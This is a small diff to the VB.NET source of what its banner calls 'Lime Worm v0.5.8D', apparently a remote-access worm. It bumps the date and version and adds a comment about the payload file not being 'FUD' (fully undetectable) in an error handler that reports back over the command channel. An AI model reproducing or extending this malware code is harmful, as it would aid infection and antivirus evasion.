@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on May./09/2018        ##
+'##        N Y A N   C A T  |||   Updated on May./10/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                    .. Lime Worm v0.5.8C ..                   ##
+'##                    .. Lime Worm v0.5.8D ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -109,7 +109,7 @@ Public Class C_Main
                 End If
             End If
         Catch ex As Exception
-            C.Send("MSG" + SPL + "Error! " + ex.Message)
+            C.Send("MSG" + SPL + "Error! " + ex.Message) 'Maybe file is not FUD or link problem
         End Try
 
     End Sub
